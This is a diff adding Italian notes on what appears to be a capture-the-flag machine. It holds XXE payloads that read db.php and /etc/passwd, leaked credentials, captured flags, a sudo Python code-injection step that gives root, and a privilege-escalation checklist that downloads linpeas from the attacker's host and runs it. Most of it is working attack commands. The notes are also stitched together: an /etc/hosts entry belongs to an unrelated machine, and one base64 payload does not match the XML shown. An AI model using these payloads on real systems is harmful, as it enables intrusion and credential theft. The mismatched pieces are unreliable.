@@ -1,0 +1,123 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.11.100
+
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
+|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
+|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Bounty Hunters
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+---------------------------------------------------------------------------------------------------------------
+Analizziamo il sito. C'è un form. Lo compiliamo, proviamo un po' di SQL injection ma niente.
+Analizzo la chiamata e trovo nella request una stringa.
+data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT48L3RpdGxlPgoJCTxjd2U%2BPC9jd2U%2BCgkJPGN2c3M%2BPC9jdnNzPgoJCTxyZXdhcmQ%2BPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
+Provo a decodificarla con base64 ed è in formato XML.
+
+Provo subito con XXE injection.
+
+ <?xml version="1.0" encoding="ISO-8859-1"?>  
+ <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">]>  
+           <bugreport>  
+           <title>&xxe;</title>  
+           <cwe>no</cwe> 
+Decodifichiamo in base64 ->
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGZvbyBbIDwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZGIucGhwIj4gXT4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4meHhlOzwvdGl0bGU%2BCgkJPGN3ZT4meHhlOzwvY3dlPgoJCTxjdnNzPiZ4eGU7PC9jdnNzPgoJCTxyZXdhcmQ%2BJnh4ZTs8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
+
+Tramite burpsuite effettuiamo un invio del form, modificando il valore data della richiesta.
+Otteniamo una response con questa stringa
+PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
+
+La decodifichiamo e otteniamo
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+?>
+
+Provo ad utilizzare queste credenziali per entrare con ssh, ma niente.
+
+Riprovo con XXE injection a leggere il file delle password
+<?xml version="1.0" encoding="ISO-8859-1"?>  
+ <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
+           <bugreport>  
+           <title>&xxe;</title>  
+           <cwe>no</cwe>  
+           <cvss>no</cvss>  
+           <reward>no</reward>  
+           </bugreport> 
+PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT48L3RpdGxlPgoJCTxjd2U%2BPC9jd2U%2BCgkJPGN2c3M%2BPC9jdnNzPgoJCTxyZXdhcmQ%2BPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
+
+Tra gli utenti c'è un development. Proviamo con la password trovata precedentemente e otteniamo l'accesso.
+ssh development@10.10.11.100 -> m19RoAU0hP41A1sTsq6K
+
+ls -> cat user.txt -> 9a288d10fd9b2afa9e998130769c0a8a
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+[ip]	[host]
+sudo echo "10.10.10.244  dynamicdns.htb no-ip.htb dynstr.htb beta.dyna.htb" >> /etc/hosts
+
+---------------------------------------------------------------------------------------------------------------
+sudo -l -> /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+
+Analizziamo il file ticketValidator.py, richiede un file con estensione .md e che abbia delle caratteristiche precise. 
+Dopo un paio di prove, scriviamo il seguente file.
+
+echo "# Skytrain Inc   
+## Ticket to root  
+__Ticket Code:__  
+**102+ 10 == 112 and __import__('os').system('/bin/bash') == False " > file.md
+
+sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+file.md -> OTTENIAMO I PERMESSI DI ROOT
+
+cat /root/root.txt -> 43d0d5475397be3fad52461ba6cf9b8c
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Cerchiamo se l'utente è tra i sudoers
+sudo -l
+
+Cerchiamo se l'utente ha SUID
+find / -perm -u=s -type f 2>/dev/null
+getcap -r / 2>/dev/null
+
+Visualizziamo i log del sistema
+cat /var/log/audit/audit.log
+
+Cerchiamo file scrivibili
+find /-writable -type d 2>/dev/null
+
+Verifichiamo la presenza di backup che possano essere utili
+apache, db ecc.
+
+Controlliamo anche i cronjob
+cat /etc/crontab
+
+Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m SimpleHTTPServer 80
+wget http://10.10.15.9:80/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh > linpeas
+
+Analizziamo linpeas
+
+
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
+---------------------------------------------------------------------------------------------------------------
